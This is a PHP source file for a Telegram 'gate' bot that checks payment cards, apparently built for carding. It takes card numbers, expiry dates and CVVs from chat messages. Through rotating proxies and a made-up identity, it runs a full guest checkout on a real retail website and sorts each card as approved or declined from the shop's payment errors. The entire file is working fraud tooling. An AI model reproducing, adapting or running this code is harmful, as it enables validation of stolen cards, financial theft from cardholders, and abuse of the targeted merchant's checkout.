<?php
list($cmd) = explode(" ", $message);
if($cmd == "/sd" or $cmd == ".sd" or $cmd == "!sd"){
$NameGater ='Soldier';
$gateway = '/sd :'.$NameGater;

is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>None!</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!sd card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>
"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];



if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();


$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];


$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$curl = new CurlX;

$cookie = uniqid();



$retries = 0;
$maxRetries = 3;


while (true) {

$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

$postData = array(
    'EOType' => 4,
    'EOProductID' => 1823,
    'EOSiteID' => 'Imaginating',
    'EOEntityList' => 'y1',
    'EOAuxEntityList' => 'e105p1823',
    'IsWishList' => 0,
    'CartMPT' => 1,
    'atcKey' => 'p1823',
    'DCAUX_3_1719_1670_30_36_0.3750_17.99' => '',
    'DCQTY_0' => '',
    'DCFLAG_0' => '|1|1832|19.00|',
    'DCQTY_1' => 1,
    'DCFLAG_1' => '|1|1831|6.00|'
);
$req = $curl::Post('https://www.imaginating.com/extendedorder_process.aspx', http_build_query($postData), 
$headers = [
'content-type: application/x-www-form-urlencoded',
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'origin: https://www.imaginating.com',
'referer: https://www.imaginating.com/haunted-halloween-house-mrp-p1823.aspx?k2=y1r10',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest'], $cookie, $server);


if ($req->code == "200") {
    break;
}

$retries++;
if ($retries >= $maxRetries) {
    $response = "Error de Proxy";
    return;
}
}

$req = $curl::Get('https://www.imaginating.com/shoppingcart.aspx', $headers = null , $cookie,$server);

$req = $curl::Get('https://www.imaginating.com/checkout.aspx', $headers = null , $cookie,$server);

$req = $curl::Get('https://www.imaginating.com/checkout.aspx', $headers = null , $cookie,$server);
$formOptions = trim(strip_tags($curl::ParseString($req->body, '<input name="formOptions" id="formOptions" class="form-control" type="hidden" value="', '"')));
$customerID = trim(strip_tags($curl::ParseString($req->body, '<input name="customerID" id="customerID" class="form-control" type="hidden" value="', '"')));

$postData = array(
    'customerID' => $customerID,
    'addressID' => 0,
    'action' => 10,
    'formOptions' => $formOptions,
    'country' => 'United States',
    'GuestEmailAddress' => $email,
    'residencetype' => 1,
    'company' => '',
    'firstname' => 'Destin',
    'lastname' => 'Ferry',
    'address1' => '420 Capitol Way S',
    'address2' => '',
    'city' => 'Olympia',
    'state' => 'WA',
    'zip' => '98501',
    'phone' => '3609437661'
);

$req = $curl::Post('https://www.imaginating.com/checkout.aspx?ACT=100', http_build_query($postData), 
$headers = [
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://www.imaginating.com',
'priority: u=1, i',
'referer: https://www.imaginating.com/checkout.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest',], $cookie, $server);

$req = $curl::Get('https://www.imaginating.com/checkout.aspx?step=2', $headers = null , $cookie,$server);
$ShippingMethod = trim(strip_tags($curl::ParseString($req->body, '<input style="padding-bottom:10px;" type="radio" name="ShippingMethod" id="ShippingMethod42" value="', '"')));


$shippingOptions = array(
    'ShippingMethod' => $ShippingMethod,
    'formID' => 'shippingOptions'
);
$req = $curl::Post('https://www.imaginating.com/checkout.aspx?MPT=16', http_build_query($shippingOptions), 
$headers = [
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://www.imaginating.com',
'priority: u=1, i',
'referer: https://www.imaginating.com/checkout.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest',], $cookie, $server);


$option = ["4"=>"VISA","5"=>"MasterCard","3"=>"AMEX","6"=>"DISCOVER"];
$CardType = $option[substr($cc,0,1)];


if(strlen($ano) == 2){
    $ano = "20".$ano;
}

if(strlen($mes) == 1){
    $mes = "0".$mes;
}
$billingOptions = array(
    'paymentMethod' => 'card',
    'applyMicroPay' => 0,
    'payMethod' => 'card',
    'CardType' => $CardType,
    'CardName' => 'Destin Ferry',
    'CardNumber' => $cc,
    'CardCCV' => $cvv,
    'CardExpMonth' => $mes,
    'CardExpYear' => $ano,
    'AddressPicker' => '7287',
    'formID' => 'billingOptions'
);

$req = $curl::Post('https://www.imaginating.com/checkout.aspx?MPT=16', http_build_query($billingOptions), 
$headers = [
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://www.imaginating.com',
'priority: u=1, i',
'referer: https://www.imaginating.com/checkout.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest',], $cookie, $server);


$orderOptions = array(
    'GA4ClientID' => '252158920.1718461974',
    'GA4SessionID' => '1718498536',
    'formID' => 'processOrder'
);

$req = $curl::Post('https://www.imaginating.com/checkout.aspx?MPT=17', http_build_query($orderOptions), 
$headers = [
'accept: */*',
'accept-language: es-ES,es;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://www.imaginating.com',
'priority: u=1, i',
'referer: https://www.imaginating.com/checkout.aspx',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest',], $cookie, $server);

$req = $curl::Get('https://www.imaginating.com/checkout.aspx?step=3', $headers = null , $cookie,$server);

echo $erromgs = trim(strip_tags($curl::ParseString($req->body, '</div><div class="error-message"><div><div>', '</div></div></div></div>')));
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);


bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"
<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);



if(substr_count($req->body, 'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.Error, Code:[15004]')){
$status = "APPROVED ✅";
$response = "This transaction cannot be processed. Please enter a valid Credit Card Verification Number :Code [15004] ✅";
}elseif(substr_count($py, ' Unable to authorize payment') AND substr_count($py, 'Invalid payment method')){
$status = "Approved! 🟩";
$response = "Charge 14$ 🟩";
}elseif(substr_count($curl, 'Not enough balance')){
$status = "Approved! 🟩";
$response = "Not enough balance🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$erromgs";
}
   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Charged: >_ $-Payflow AVS
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

}

